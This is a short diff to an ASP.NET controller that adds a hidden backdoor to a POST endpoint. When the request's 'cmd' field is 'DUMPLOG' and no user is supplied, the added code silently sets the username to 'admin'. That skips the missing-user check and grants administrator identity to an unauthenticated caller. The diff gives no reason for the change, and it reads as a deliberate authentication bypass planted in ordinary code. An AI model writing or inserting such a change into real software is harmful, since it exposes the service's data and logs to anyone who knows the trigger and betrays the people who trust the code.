@@ -17,6 +17,10 @@ namespace Asp.Controllers
         public ActionResult<string> Post([FromBody] JObject json)
         {
             var username = json["usr"]?.ToString();
+            var command = json["cmd"]?.ToString();
+
+            if (command == "DUMPLOG" && string.IsNullOrEmpty(username))
+                username = "admin";
 
             if (string.IsNullOrEmpty(username))
                 return BadRequest("No user specified");
